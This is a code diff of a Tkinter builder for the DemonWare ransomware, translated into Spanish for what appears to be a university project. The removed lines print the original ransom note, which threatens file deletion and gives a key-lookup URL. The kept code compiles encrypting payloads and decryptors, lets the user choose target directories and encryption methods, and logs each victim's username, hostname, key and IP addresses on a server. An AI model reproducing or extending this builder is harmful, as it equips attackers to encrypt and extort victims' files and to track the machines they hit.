@@ -186,27 +186,8 @@ tar
 tar.gz
 rar''')
 
-        self.options['msg'].set('''Tango Down!
-
-Seems like you got hit by DemonWare ransomware!
-
-Don't Panic, you get have your files back!
-
-DemonWare uses a basic encryption script to lock your files.
-This type of ransomware is known as CRYPTO.
-You'll need a decryption key in order to unlock your files.
-
-Your files will be deleted when the timer runs out, so you better hurry.
-You have 10 hours to find your key
-
-C'mon, be glad I don't ask for payment like other ransomware.
-
-Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.
-
-Kind regards,
-
-Zeznzo
-''')
+        self.options['msg'].set('''PROYECTO PYTHON SEMESTRE 2020-A''')
+        
         self.options['img_base64'].set('''iVBORw0KGgoAAAANSUhEUgAAAlgAAAIOCAMAAABTb4MEAAAAY1BMVEVHcEy/v79/f39QUFBAQEAg
 ICAAAAAQEBCfn5/f39/v7+9gYGCvr68/NwB/bQBPRAAgGwDPz88wMDCOewDOsQD92gDtzACulgBv
 XwAQDgDdvwBfUgCeiAAvKQCPj4++pABwcHBFCib7AAAAAXRSTlMAQObYZgAAGlpJREFUeAHs29Ga
@@ -377,7 +358,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         host.grid(row = 2, column = 0, columnspan = 2)
         host.focus()
 
-        Label(self.set, text = 'port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
+        Label(self.set, text = 'Port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
         port = Entry(self.set, textvariable = self.options['port'], width = 30)
         port.grid(row = 4, column = 0, columnspan = 2)
 
@@ -562,7 +543,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             self.options['os'].set('linux')
             win.config(state = DISABLED)
             mac.config(state = DISABLED)
-        an.config(state = DISABLED)
 
     def compile_payload(self):
         icon = False
@@ -607,14 +587,14 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 os.system('%s -F -w %s %s %s %s' % (py, tk, crypto, pyaes, self.options['payload_path'].get()))
 
             if os.path.isfile('./decryptor.py'):
-                ask = messagebox.askyesno('Found decryptor!', 'Compile decryptor now?')
+                ask = messagebox.askyesno('Found decryptor!', 'Compilar Desencriptador ahora?')
                 if ask == False:
-                    messagebox.showinfo('SUCCESS', 'Payload compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
+                    messagebox.showinfo('SUCCESS', 'Payload Compilado Exitosamente')
                     self.comp.destroy()
                 elif ask == True:
                     self.compile_decrypt()
             else:
-                return messagebox.showinfo('SUCCESS', 'Payload compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
+                return messagebox.showinfo('SUCCESS', 'Payload Compilado Exitosamente')
 
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)
@@ -653,7 +633,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
             os.system('%s -F -w %s %s %s %s %s' % (py, tk, crypto, pyaes, pymsg, self.options['decryptor_path'].get()))
 
-            messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
+            messagebox.showinfo('SUCCESS', 'Payload Compilado Exitosamente')
             self.comp.destroy()
 
         except Exception as e:
@@ -702,19 +682,19 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         set_ext = Button(content_frame, text = 'Extensiones', command = self.set_ext, width = 25).grid(row = 3, column = 0)
 
         options_frame = LabelFrame(self.gen, text = 'Opciones')
-        options_frame.grid(row = 1, column = 1, sticky = 'nw')
+        options_frame.grid(row = 0, column = 3, sticky = 'nw')
         Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Admin', variable = self.options['runas'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
 
         meth_frame = LabelFrame(self.gen, text = 'Método de Encriptación')
-        meth_frame.grid(row = 2, column = 1, sticky = 'w')
+        meth_frame.grid(row = 1, column = 1, sticky = 'w')
         Radiobutton(meth_frame, text = 'Sobrescribir y Renombrar', variable = self.options['method'], value = 'override').grid(row = 0, column = 0, sticky = 'w')
         Radiobutton(meth_frame, text = 'Copiar y Eliminar', variable = self.options['method'], value = 'copy').grid(row = 1, column = 0, sticky = 'w')
 
         finish_frame = LabelFrame(self.gen, text = 'Finalizar')
-        finish_frame.grid(row = 2, column = 0, columnspan = 1, sticky = 'w')
-        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 25).grid(row = 0, column = 0)
+        finish_frame.grid(row = 1, column = 2, columnspan = 1, sticky = 'w')
+        generate = Button(finish_frame, text = "Generar", command = self.make_demon, width = 25).grid(row = 0, column = 0)
 
     def set_img(self):
         try:
@@ -769,21 +749,21 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def set_dirs(self):
         self.dirs = Toplevel()
-        self.dirs.title(string = 'Set Target Directories')
+        self.dirs.title(string = 'Definir Directorios')
         self.dirs.configure(background = 'white')
         self.dirs.resizable(0,0)
 
         self.dirs.bind("<Escape>", self.close_set_target_dirs)
 
-        Label(self.dirs, text = 'Working Directory', background = 'white').grid(row = 0, column = 0, sticky = 'w')
+        Label(self.dirs, text = 'Root', background = 'white').grid(row = 0, column = 0, sticky = 'w')
         self.options['new_working_dir'] = Entry(self.dirs, width = 30)
         self.options['new_working_dir'].grid(row = 1, column = 0, sticky = 'n')
 
-        Label(self.dirs, text = 'Target Directories', background = 'white').grid(row = 2, column = 0, sticky = 'w')
+        Label(self.dirs, text = 'Directorios', background = 'white').grid(row = 2, column = 0, sticky = 'w')
         self.options['new_target_dirs'] = Text(self.dirs, height = 10, width = 40)
         self.options['new_target_dirs'].grid(row = 3, column = 0)
 
-        save = Button(self.dirs, text = 'SAVE', command = self.change_target_dirs, width = 15).grid(row = 4, column = 0)
+        save = Button(self.dirs, text = 'Guardar', command = self.change_target_dirs, width = 15).grid(row = 4, column = 0)
 
         self.options['new_working_dir'].insert(END, self.options['working_dir'].get())
         self.options['new_target_dirs'].insert(END, self.options['target_dirs'].get())
@@ -822,7 +802,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         try:
             create_decrypt(self.options['type'].get())
 
-            messagebox.showinfo('SUCCESS', 'Payload and decryptor were successfully generated!\n\nFiles saved to:\n./payload.py\n./decryptor.py')
+            messagebox.showinfo('SUCCESS', 'Payload y Descifrador generados exitosamente.')
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to generate decryptor!\n\n%s' % e)
 
@@ -846,7 +826,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         if p == False:
             return
 
-        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key or method is not correct, your (encrypted) files will return corrupted.\n\n You might want to make a backup!')
+        a = messagebox.askokcancel('ALERTA', 'Esta herramienta descifrará sus archivos con la clave dada.\n\nSin embargo, si su clave o método no es correcto, sus archivos (encriptados) serán dañados\n\n ¡Es posible que desee hacer una copia de seguridad!')
         if a == True:
             pass
         else:
@@ -929,19 +909,13 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                                 lon = lookup.split(',')[7]
 
                             result = '''
-[Occured]    -> %s %s
+[Fecha]    -> %s %s
 [Username]   -> %s
 [OS]         -> %s
 [Hostname]   -> %s
 [Key]        -> %s
-[Remote IP]  -> %s
-[Local IP]   -> %s
-[Continent]  -> %s
-[Country]    -> %s
-[Region]     -> %s
-[City]       -> %s
-[ISP]        -> %s
-[ZIP]        -> %s
+[IP Remota]  -> %s
+[IP Local]   -> %s
 
 ''' % (time.strftime('%d/%m/%Y'),
         time.strftime('%X'),
@@ -950,13 +924,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         hostname,
         key,
         ip,
-        local,
-        con,
-        country,
-        region,
-        city,
-        isp,
-        zip)
+        local)
 
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
